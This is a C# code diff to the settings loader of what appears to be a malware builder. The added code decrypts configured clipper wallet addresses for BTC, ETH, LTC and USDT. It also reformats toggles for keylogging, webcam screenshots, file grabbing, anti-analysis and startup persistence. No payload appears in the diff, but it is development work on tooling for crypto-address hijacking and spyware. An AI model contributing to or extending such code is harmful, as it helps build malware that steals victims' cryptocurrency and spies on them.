@@ -27,7 +27,25 @@ internal sealed class Settings
             if (File.Exists(SettingsPath))
             {
                 var json = File.ReadAllText(SettingsPath);
-                return JsonSerializer.Deserialize<SettingsData>(json) ?? new SettingsData();
+                var settings = JsonSerializer.Deserialize<SettingsData>(json) ?? new SettingsData();
+                
+                // Decrypt clipper addresses for display as placeholders
+                settings.ClipperBTC = Crypt.DecryptConfig(settings.ClipperBTC);
+                settings.ClipperETH = Crypt.DecryptConfig(settings.ClipperETH);
+                settings.ClipperLTC = Crypt.DecryptConfig(settings.ClipperLTC);
+                settings.ClipperUSDT = Crypt.DecryptConfig(settings.ClipperUSDT);
+                
+                // Convert boolean values from "1"/"0" to "y"/"n" for display
+                settings.Debug = settings.Debug == "1" ? "y" : settings.Debug == "0" ? "n" : settings.Debug;
+                settings.AntiAnalysis = settings.AntiAnalysis == "1" ? "y" : settings.AntiAnalysis == "0" ? "n" : settings.AntiAnalysis;
+                settings.Startup = settings.Startup == "1" ? "y" : settings.Startup == "0" ? "n" : settings.Startup;
+                settings.StartDelay = settings.StartDelay == "1" ? "y" : settings.StartDelay == "0" ? "n" : settings.StartDelay;
+                settings.WebcamScreenshot = settings.WebcamScreenshot == "1" ? "y" : settings.WebcamScreenshot == "0" ? "n" : settings.WebcamScreenshot;
+                settings.Keylogger = settings.Keylogger == "1" ? "y" : settings.Keylogger == "0" ? "n" : settings.Keylogger;
+                settings.Clipper = settings.Clipper == "1" ? "y" : settings.Clipper == "0" ? "n" : settings.Clipper;
+                settings.Grabber = settings.Grabber == "1" ? "y" : settings.Grabber == "0" ? "n" : settings.Grabber;
+                
+                return settings;
             }
         }
         catch
